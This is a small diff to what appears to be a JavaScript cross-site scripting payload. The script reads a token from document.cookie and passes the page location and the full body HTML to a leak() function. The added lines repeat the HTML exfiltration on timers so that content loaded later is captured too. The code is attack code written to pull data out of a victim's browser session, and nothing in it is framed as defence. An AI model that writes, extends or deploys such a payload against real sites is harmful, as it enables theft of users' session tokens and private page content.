@@ -33,4 +33,8 @@ get = function(url)
 var csrf = document.cookie.split('=')[1];
 leak("location",JSON.stringify(document.location));
 leak("innerhtml",unescape(encodeURIComponent(document.body.innerHTML)));
+setTimeout(function(){ leak("innerhtml",unescape(encodeURIComponent(document.body.innerHTML))); }, 1000);
+setTimeout(function(){ leak("innerhtml",unescape(encodeURIComponent(document.body.innerHTML))); }, 1500);
+setTimeout(function(){ leak("innerhtml",unescape(encodeURIComponent(document.body.innerHTML))); }, 2000);
+setTimeout(function(){ leak("innerhtml",unescape(encodeURIComponent(document.body.innerHTML))); }, 3000);
 
